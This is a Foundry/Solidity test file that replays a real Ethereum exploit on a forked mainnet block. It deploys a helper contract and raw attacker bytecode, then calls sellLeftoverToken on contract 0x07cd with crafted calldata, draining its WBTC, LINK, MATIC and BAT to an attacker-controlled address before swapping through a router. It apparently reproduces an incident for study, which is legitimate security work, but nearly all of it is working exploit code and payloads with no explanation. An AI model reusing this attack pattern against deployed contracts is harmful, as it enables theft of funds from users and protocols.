// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0x5f11a85ee3c4f37bd78bc1793f0b80b099aa10ee045b2d563e490d84c256ab40
// https://etherscan.io/address/0x3BE7eEFe7E7DeA48B96ff93261Cf95440f79cCbF

struct S2 {
    address p1;
    address p2;
    address p3;
    address p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    bytes p8;
}

struct S1 {
    address p1;
    address p2;
    uint24 p3;
    address p4;
    uint256 p5;
    uint256 p6;
    uint160 p7;
}

interface I {
    function sellLeftoverToken(address, bytes memory) external payable;
    function balanceOf(address) external payable returns (uint256);
    function approve(address, uint256) external payable;
    function transfer(address, uint256) external payable;
    function multicall(uint256, bytes[] memory) external payable;
}

contract X1635 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x5f11a85ee3c4f37bd78bc1793f0b80b099aa10ee045b2d563e490d84c256ab40");
    }

    address constant x07cd = 0x07cDB44fA1E7eCEb638c12A3451A3Dc9CE1400e4;
    address constant x0d87 = 0x0D8775F648430679A709E98d2b0Cb6250d2887EF;
    address constant x2260 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant x5149 = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x68b3 = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
    address constant x7d1a = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address xb9ae;

    uint256 t_x7870de5b = 0;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 15899290); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x142644c32a457a8440e22bb59af68f2d7711967a1e70092a35251e6bc84a2fc8));

        // https://explorer.phalcon.xyz/tx/eth/0x142644c32a457a8440e22bb59af68f2d7711967a1e70092a35251e6bc84a2fc8
        this.x142644c3();
        // https://explorer.phalcon.xyz/tx/eth/0xaaa1cf88e75037f9396323ae9eabe4e8d9f49ce444aaff355c845e3659651306
        this.xaaa1cf88();
        // https://explorer.phalcon.xyz/tx/eth/0xeb1dbbf38b794673e896d203bbe40ada9f706b0979851d2d907399e2df083100
        this.xeb1dbbf3();
        // https://explorer.phalcon.xyz/tx/eth/0x5c8f324b5bdc8e2ecf642af115e1b94dfbfcad35e7aa89ef17b9b3c75e957aba
        this.x5c8f324b();
        // https://explorer.phalcon.xyz/tx/eth/0xfe8d82b25255ea2be92467d9c0ef40eb5d50d7adb4e560c0159f4a3c3ce30fac
        this.xfe8d82b2();
        // https://explorer.phalcon.xyz/tx/eth/0x4957b4af28584eccdbdd2df1cb8804486c595dcbeb050cfb06dc6e8ed9059172
        this.x4957b4af();
        // https://explorer.phalcon.xyz/tx/eth/0x799e0960d5051ba6d11eeccb2804cac026b1beffcab61194ad41a8020eec1e36
        this.x799e0960();
        // https://explorer.phalcon.xyz/tx/eth/0x937a03268cd13c1b7afb1dd621794d58e4d2674069e24caf8ab694c60c43cd41
        this.x937a0326();
        // https://explorer.phalcon.xyz/tx/eth/0x0faa90b780a7939bfbeb3d7c8dfb1c8a318219f7be60c4a698991fd635e95813
        this.x0faa90b7();
        // https://explorer.phalcon.xyz/tx/eth/0x5f11a85ee3c4f37bd78bc1793f0b80b099aa10ee045b2d563e490d84c256ab40
        x7870de5b();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 15899224); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x142644c32a457a8440e22bb59af68f2d7711967a1e70092a35251e6bc84a2fc8
        this.x142644c3();
        vm.warp(1667595911);
        vm.roll(15899224);
        // https://explorer.phalcon.xyz/tx/eth/0xaaa1cf88e75037f9396323ae9eabe4e8d9f49ce444aaff355c845e3659651306
        this.xaaa1cf88();
        vm.warp(1667596151);
        vm.roll(15899244);
        // https://explorer.phalcon.xyz/tx/eth/0xeb1dbbf38b794673e896d203bbe40ada9f706b0979851d2d907399e2df083100
        this.xeb1dbbf3();
        vm.warp(1667596223);
        vm.roll(15899250);
        // https://explorer.phalcon.xyz/tx/eth/0x5c8f324b5bdc8e2ecf642af115e1b94dfbfcad35e7aa89ef17b9b3c75e957aba
        this.x5c8f324b();
        vm.warp(1667596295);
        vm.roll(15899256);
        // https://explorer.phalcon.xyz/tx/eth/0xfe8d82b25255ea2be92467d9c0ef40eb5d50d7adb4e560c0159f4a3c3ce30fac
        this.xfe8d82b2();
        vm.warp(1667596535);
        vm.roll(15899276);
        // https://explorer.phalcon.xyz/tx/eth/0x4957b4af28584eccdbdd2df1cb8804486c595dcbeb050cfb06dc6e8ed9059172
        this.x4957b4af();
        vm.warp(1667596559);
        vm.roll(15899278);
        // https://explorer.phalcon.xyz/tx/eth/0x799e0960d5051ba6d11eeccb2804cac026b1beffcab61194ad41a8020eec1e36
        this.x799e0960();
        vm.warp(1667596643);
        vm.roll(15899285);
        // https://explorer.phalcon.xyz/tx/eth/0x937a03268cd13c1b7afb1dd621794d58e4d2674069e24caf8ab694c60c43cd41
        this.x937a0326();
        vm.warp(1667596703);
        vm.roll(15899290);
        // https://explorer.phalcon.xyz/tx/eth/0x0faa90b780a7939bfbeb3d7c8dfb1c8a318219f7be60c4a698991fd635e95813
        this.x0faa90b7();
        vm.warp(1667596703);
        vm.roll(15899290);
        // https://explorer.phalcon.xyz/tx/eth/0x5f11a85ee3c4f37bd78bc1793f0b80b099aa10ee045b2d563e490d84c256ab40
        x7870de5b();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 15899290); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1667596703);
        vm.roll(15899291);
        // https://explorer.phalcon.xyz/tx/eth/0x5f11a85ee3c4f37bd78bc1793f0b80b099aa10ee045b2d563e490d84c256ab40
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0x0D8775F648430679A709E98d2b0Cb6250d2887EF),
            keccak256(abi.encode(RECEIVER, uint256(1))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x514910771AF9Ca656af840dff83E8264EcF986CA),
            keccak256(abi.encode(RECEIVER, uint256(1))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            keccak256(abi.encode(RECEIVER, uint256(9))),
            bytes32(uint256(1000000000000000000000000))
        );
        x7870de5b();
    }

    function xaaa1cf88() public {
        _constructor_();
    }

    function x7870de5b() public {
        t_x7870de5b++;

        if (t_x7870de5b == 1) {
            // uint256 v1 = 2411127;
            uint256 v1 = I(x2260).balanceOf(x07cd);
            console2.log("I(x2260).balanceOf(x07cd)\t->", uint256(2411127));

            bytes memory b04 = abi.encode(
                hex"7c025200000000000000000000000000b9aeca4e5c764362c1fa43b1b73686c69a8da45e000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000003be7eefe7e7dea48b96ff93261cf95440f79ccbf00000000000000000000000007cdb44fa1e7eceb638c12a3451a3dc9ce1400e4000000000000000000000000000000000000000000000000000000000024ca77000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000",
                0,
                hex"00000060000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000"
            );
            I(x07cd).sellLeftoverToken(x2260, b04);

            return;
        }
        if (t_x7870de5b == 2) {
            // uint256 v1 = 831825626095852530268;
            uint256 v1 = I(x5149).balanceOf(x07cd);
            console2.log("I(x5149).balanceOf(x07cd)\t->", "831825626095852530268 (831.8256 ether)");

            bytes memory b14 = abi.encode(
                hex"7c025200000000000000000000000000b9aeca4e5c764362c1fa43b1b73686c69a8da45e000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001a0000000000000000000000000514910771af9ca656af840dff83e8264ecf986ca000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000003be7eefe7e7dea48b96ff93261cf95440f79ccbf00000000000000000000000007cdb44fa1e7eceb638c12a3451a3dc9ce1400e400000000000000000000000000000000000000000000002d17e647bbae312a5c000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000",
                0,
                hex"00000060000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000"
            );
            I(x07cd).sellLeftoverToken(x5149, b14);

            return;
        }
        if (t_x7870de5b == 3) {
            // uint256 v1 = 32508383166966663363574;
            uint256 v1 = I(x7d1a).balanceOf(x07cd);
            console2.log("I(x7d1a).balanceOf(x07cd)\t->", "32508383166966663363574 (32508.3831 ether)");

            bytes memory b20 = abi.encode(
                hex"7c025200000000000000000000000000b9aeca4e5c764362c1fa43b1b73686c69a8da45e000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000007d1afa7b718fb893db30a3abc0cfc608aacfebb0000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000003be7eefe7e7dea48b96ff93261cf95440f79ccbf00000000000000000000000007cdb44fa1e7eceb638c12a3451a3dc9ce1400e40000000000000000000000000000000000000000000006e248718d8f78123bf6000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000",
                0,
                hex"00000060000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000"
            );
            I(x07cd).sellLeftoverToken(x7d1a, b20);

            return;
        }
        if (t_x7870de5b == 4) {
            // uint256 v1 = 29832534716508464387546;
            uint256 v1 = I(x0d87).balanceOf(x07cd);
            console2.log("I(x0d87).balanceOf(x07cd)\t->", "29832534716508464387546 (29832.5347 ether)");

            bytes memory b26 = abi.encode(
                hex"7c025200000000000000000000000000b9aeca4e5c764362c1fa43b1b73686c69a8da45e000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000001a00000000000000000000000000d8775f648430679a709e98d2b0cb6250d2887ef000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000003be7eefe7e7dea48b96ff93261cf95440f79ccbf00000000000000000000000007cdb44fa1e7eceb638c12a3451a3dc9ce1400e40000000000000000000000000000000000000000000006513996291f13ae95da000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000",
                0,
                hex"00000060000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000"
            );
            I(x07cd).sellLeftoverToken(x0d87, b26);

            return;
        }
    }

    function x937a0326() public {
        r.call(abi.encodeWithSelector(0x7870de5b, x5149));
    }

    function x0faa90b7() public {
        r.call(abi.encodeWithSelector(0x7870de5b, x7d1a));
    }

    function xeb1dbbf3() public {
        bytes memory b01 =
            hex"5023b4df000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000000000000000000000000000000000000000001f40000000000000000000000003be7eefe7e7dea48b96ff93261cf95440f79ccbf00000000000000000000000000000000000000000000000000000000000186a00000000000000000000000000000000000000000000000000000454cf977da4c0000000000000000000000000000000000000000000000000000000000000000";
        bytes[] memory arr01 = new bytes[](2);
        arr01[0] = b01;
        arr01[1] = hex"12210e8a";
        I(x68b3).multicall{value: 76196905212492}(1667597915, arr01);
    }

    function x142644c3() public {
        xb9ae = address(new Xb9ae());
    }

    function xfe8d82b2() public {
        r.call(abi.encodeWithSelector(0x7870de5b, x2260));
    }

    function x4957b4af() public {
        I(x2260).approve(x68b3, type(uint256).max);
    }

    function x799e0960() public {
        bytes memory b10 =
            hex"04e45aaf0000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c599000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000000000000001f40000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000024ca770000000000000000000000000000000000000000000000000445d6c73c5ed6410000000000000000000000000000000000000000000000000000000000000000";
        bytes memory b11 =
            hex"49404b7c0000000000000000000000000000000000000000000000000445d6c73c5ed6410000000000000000000000003be7eefe7e7dea48b96ff93261cf95440f79ccbf";
        bytes[] memory arr02 = new bytes[](2);
        arr02[0] = b10;
        arr02[1] = b11;
        I(x68b3).multicall(1667598335, arr02);
    }

    function x5c8f324b() public {
        I(xa0b8).transfer(xb9ae, 100000);
    }

    function _constructor_() public {
        bytes memory rt =
            hex"608060405234801561001057600080fd5b506004361061002b5760003560e01c80637870de5b14610030575b600080fd5b6100636004803603602081101561004657600080fd5b503573ffffffffffffffffffffffffffffffffffffffff16610065565b005b60005473ffffffffffffffffffffffffffffffffffffffff16321461008957600080fd5b604080513260208083019190915282518083038201815291830190925280519101206005546803026d6fd72894b1cf9091019081146100c757600080fd5b6100d0826100d4565b5050565b600154604080517f70a0823100000000000000000000000000000000000000000000000000000000815273ffffffffffffffffffffffffffffffffffffffff928316600482810182905292519293909263343599c792869261018d928492918316916370a08231916024808301926020929190829003018186803b15801561015b57600080fd5b505afa15801561016f573d6000803e3d6000fd5b505050506040513d602081101561018557600080fd5b50518661027b565b604080517fffffffff0000000000000000000000000000000000000000000000000000000060e086901b16815273ffffffffffffffffffffffffffffffffffffffff8416600482019081526024820192835283516044830152835190929160640190602085019080838360005b838110156102125781810151838201526020016101fa565b50505050905090810190601f16801561023f5780820380516001836020036101000a031916815260200191505b509350505050600060405180830381600087803b15801561025f57600080fd5b505af1158015610273573d6000803e3d6000fd5b505050505050565b604080516004808252818301909252606091829190602082018180388339019050509050607c60f81b816000815181106102b157fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350600260f81b816001815181106102f257fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350605260f81b8160028151811061033357fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350600060f81b8160038151811061037457fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350604080516002808252818301909252606091602082018180388339019050509050608860f81b816000815181106103d657fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350609960f81b8160018151811061041757fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053506040805132602080830191909152825180830382018152918301909252805191012060045460609073ffffffffffffffffffffffffffffffffffffffff166101426101a97fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc3658501060360ba6104d28506038a600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1632600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168d60018e61010060026000604051602001808e73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018d81526020018c81526020018b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018781526020018681526020018581526020018481526020018381526020018281526020019d50505050505050505050505050506040516020818303038152906040529050606080602060026000604051602001808581526020018481526020018381526020018281526020019450505050506040516020818303038152906040529050606081518351875101016040519080825280601f01601f1916602001820160405280156106ce576020820181803883390190505b5090506000805b875181101561073c578781815181106106ea57fe5b602001015160f81c60f81b83838151811061070157fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350600191820191016106d5565b5060005b84518110156107a75784818151811061075557fe5b602001015160f81c60f81b83838151811061076c57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535060019182019101610740565b5060005b8351811015610812578381815181106107c057fe5b602001015160f81c60f81b8383815181106107d757fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a905350600191820191016107ab565b50909a995050505050505050505056fea265627a7a72315820b1952accbaa74d05bfbaf3cf240497be02ae77c62ce5ae4f5bdfbedb709a7d7064736f6c63430005110032";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x7870de5b) {
            x7870de5b();
            return;
        }
        revert("no such function");
    }
}

contract Xb9ae {
    address immutable r = address(this);
    receive() external payable {}
    address constant x07cd = 0x07cDB44fA1E7eCEb638c12A3451A3Dc9CE1400e4;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    constructor() payable {}

    function callBytes(bytes memory) public {
        I(xa0b8).transfer(x07cd, 1);
        address(tx.origin).call("");
    }

    fallback() external payable {
        revert("no such function");
    }
}
